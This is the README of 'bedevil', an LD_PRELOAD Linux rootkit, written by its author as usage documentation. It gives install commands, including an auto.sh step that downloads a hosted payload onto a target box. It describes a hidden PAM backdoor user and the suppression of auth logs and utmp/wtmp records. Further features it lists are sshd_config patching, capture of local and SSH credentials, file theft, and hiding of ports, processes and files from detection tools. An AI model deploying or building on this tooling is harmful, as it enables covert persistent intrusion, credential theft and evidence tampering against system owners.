# bedevil

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

</br>

 * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 * bedevil is designed to be more robust, faster and efficient than vlany.

## Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * The only dependency inherently required is bash, for running all of the setup scripts.
   * This won't be the case for much longer...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't can be installed with the available script.


<hr>

## bedevil.sh
### Usage

<img src=https://i.imgur.com/s9VloGH.png alt="bedevil.sh script output"/>

 * __The order in which you pass flags to this script are essential.__

#### Usage examples
 * *Compile only:* `./bedevil.sh -dc` (compile the rootkit in your cwd)  
 * *Changing values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
 * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
 * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
 * **Compressing include directory & using resulting tarball**:
     * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
     * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`

<hr>

## Example installation
 * In this example, the command I issued was
   * `BD_UNAME=sexlovegod ./bedevil.sh -i`

<img src=https://i.imgur.com/e5Oc8kt.png alt="Example installation result"/>

### Logging in to new backdoor user
 * Upon successful installation you can log in to the box using your backdoor credentials.

<img src=https://i.imgur.com/MlsC2mN.png alt="Example connection to PAM backdoor." />

 * _emule_ is just a box I've got running on my local network.
 * If the box you're trying to log into has their ssh service open on a different port (not 22) you can specify a different port to use by changing the value of `SSH_PORT`, either at runtime or edit it in the script.
 * Example: `bash SSH_PORT=23 etc/ssh.sh ...`
 * There is functionality right now within bedevil where, if it exists, `./etc/id_rsa.pub` will be copied to `$INSTALL_DIR/.ssh/authorized_keys`.
  * This is so that we don't have to force the option of password authentication in the box's sshd_config in order to access the backdoor.
  * Due to the fact that functions are being hooked to grant backdoor access, this does not work as of yet.
  * It isn't just a matter of storing a public key & having it authenticate you when logging in.
  * There is a functionality within bdvl that will more or less eliminate this being a problem.
    * See __PATCH_SSHD_CONFIG__.

<hr>

## auto.sh
 * Instant installation script for use with preconfigured setups.
 * Uses the base64'd tar.gz archive created after compression.
   * You need to change where this script will try to get this file from.
     * See `B64TARGZ_LOCATION`.
   * `wget`/`curl` is required for downloading the file.
     * You could instruct the script to use a file available locally, instead of trying to download one.
 * This script relies on the contents & format of the 'settings.cfg' & 'toggles.cfg' files.
   * Both of these files are written by `bedevil.sh` during compression.
   * This method of storing settings could be better than what it is right now.
   * But considering the purpose, this is ok.

### Example
 * `BD_UNAME=sexand BD_PWD=lovegod ./bedevil.sh -vzd`
 * Host resulting `*.so.inc.b64` somewhere you can access from the target.
 * The box must be able to use `curl`/`wget` to download it.
 * Change `B64TARGZ_LOCATION` accordingly.

<img src=https://i.imgur.com/QPCxDRP.png/>
<img src=https://i.imgur.com/jzmvsiM.png/>

 * The good thing about this is that you can use the same `.b64` file, pretty much everywhere you like.
 * No longer will you have to remember or note down 20 different credentials for 20 different boxes.
 * You can use the same username, password & hidden port for all.
   * 'One-command-does-all'
 * That, and installation takes a matter of seconds with this method.

#### Notes
 * At the stage this script is currently in, utilising the dynamic linker patch isn't as straight forward as it should/I'd like it to be.
 * This script will automatically install required dependencies for the rootkit to work. If you aren't a fan of this you can comment out the line responsible for this.

<hr>

## Features
 * [`inc/toggles.h`](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h)
   * Exactly what it sounds like.
   * Provides a means of controlling what bedevil can & will do upon installation.
   * Ample details within comments. 
 * See the table below.

| Toggle                   | Info                                                            | Default status | Dependency | Ignored(?) |
| :----------------------- | :-------------------------------------------------------------- | :------------- | :--------- | :--------- |
| __USE_PAM_BD__           | allows interactive login as a backdoor user via ssh             | on             | libpam     | no         |
| __LOG_LOCAL_AUTH__       | log successful user authentications on the box                  | on             | libpam     | no         |
| __HIDE_SELF__            | hides files and processes based on rootkit magic GID            | on             | -          | yes        |
| __FORGE_MAPS__           | hides rootkit presence from process map files                   | on             | -          | yes        |
| __HIDE_PORTS__           | hides ports & port ranges defined in 'hide_ports' file          | on             | -          | yes        |
| __DO_REINSTALL__         | maintains the rootkit's preload file                            | on             | -          | yes        |
| __DO_EVASIONS__          | hides rootkit presence from unsavoury processes                 | on             | -          | yes        |
| __READ_GID_FROM_FILE__   | magic GID value is changeable from backdoor shell via command.  | on             | -          | no         |
| __AUTO_GID_CHANGER__     | the magic GID will refresh every so often. see comments.        | on             | -          | no         |
| __HIDE_MY_ASS__          | keep track of all files created by rootkit user (for rehiding). | on             | -          | no         |
| __PATCH_SSHD_CONFIG__    | this will keep `UsePAM` & `PasswordAuthentication` enabled      | on             | -          | no         |
| __BACKDOOR_UTIL__        | allows access to a host of backdoor utilities. see comments.    | on             | -          | yes        |
| __SET_MAGIC_ENV_UNHIDE__ | set magic env var in `./bdv unhideself` shell process.          | on             | -          | no         |
| __BACKDOOR_PKGMAN__      | safe package management access from backdoor shell.             | on             | -          | no         |
| __LOG_SSH__              | logs login attempts from over ssh                               | on             | -          | no         |
| __FILE_STEAL__           | attempts to steal FoI when opened by open/fopen                 | on             | -          | no         |
| __LINK_IF_ERR__          | link said FoI if we can't copy it                               | off            | -          | yes        |
| __USE_CRYPT__            | to use or not to use libcrypt                                   | on             | libcrypt   | yes        |

<hr>

#### Backdoor utility commands
 * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.

<img src=https://i.imgur.com/oErGMrL.png alt="available backdoor commands in bdvl"/>

#### Magic GID
 * __READ_GID_FROM_FILE__ allows changing of the rootkit's magic GID whenever you like.
 * There is a command available from within the backdoor for manual changing of the rootkit's GID.
   * `./bdv changegid`
 * __AUTO_GID_CHANGER__ is more or less what it sounds like. The rootkit will refresh its magic GID __at least__ every `GID_CHANGE_MINTIME` seconds.
   * This value can be found in [`inc/toggles.h`](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h)
   * The rootkit will not automatically change its GID when there are still rootkit processes running.
   * Otherwise there is a pretty high chance of being discovered since previous processes left with the previous GID would be visible.
 * __HIDE_MY_ASS__ is intended to be a means of keeping track of files created, outside of the installation directory, by (you) the rootkit user.
   * For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change.
   * Paths are automatically kept track of upon creation in a backdoor shell/general rootkit process.
   * The file which contains all can be found in `my_ass` within the installation directory.
     * Paths in here will be rehidden upon GID changes.
     * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.

##### Example changing magic GID
<img src=https://i.imgur.com/vo4yn29.png alt="gid change example"/>

#### PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * During installation you're given a username & password.
   * By default the username & password are randomly generated.
   * You can specify a username and/or password of your own by setting them before running `bedevil.sh`.
     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
 * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/master/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/master/inc/hooks/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 * Additionally the functions responsible for writing authentication logs have been hooked & intercepted to totally stop any sort of logs being written upon backdoor login.
   * See these hooks, [here (syslog)](https://github.com/kcaaj/bdvl/tree/master/inc/hooks/syslog) & [here (pam_syslog)](https://github.com/kcaaj/bdvl/blob/master/inc/backdoor/pam/pam_syslog.c).
   * _If the parent process of whatever is trying to write said auth log is that of a hidden process, the function in question simply does nothing._
   * Previously in bedevil, when interacting with the PAM backdoor, a log would be written stating that a session had been opened/closed for the root user.
   * So now this is no longer the case...
 * A problem with using this is that `UsePAM` & `PasswordAuthentication` must be enabled in the sshd config.
   * __PATCH_SSHD_CONFIG__ takes care of this problem.
   * See [here](https://github.com/kcaaj/bdvl/blob/master/inc/backdoor/sshdpatch/sshdchk.c) on the how & when this functionality works.

#### Credential logging
 * __LOG_LOCAL_AUTH__
   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
   * Log results are available in your installation directory.
 * __LOG_SSH__
   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
   * Again, logs are available in your installation directory.

<hr>

#### Evasion & hiding

##### Port hiding
 * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
```
$ cat hide_ports
9146
304-306
1000-1003
```
*Where a hyphen is the range delimiter...*

##### Rootkit presence
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
 * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)

##### Scary things
 * bedevil will hide from defined scary processes, paths & environment variables.
 * See [`inc/hiding/evasion/evasion.h`](https://github.com/kcaaj/bdvl/blob/master/inc/hiding/evasion/evasion.h) for the things that bedevil will evade.
 * i.e.: Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.


<!--

RANDOM NOTES:
  having DO_EVASIONS enabled allows a 'bug' where a root user can
  uninstall the rootkit by running ldd through an infinite
  loop. i.e.: `while true; do ldd /bin/echo; done`

LINKS OF INTEREST:
 - https://pastebin.com/rZvjDzFK

asddsadsad

-->
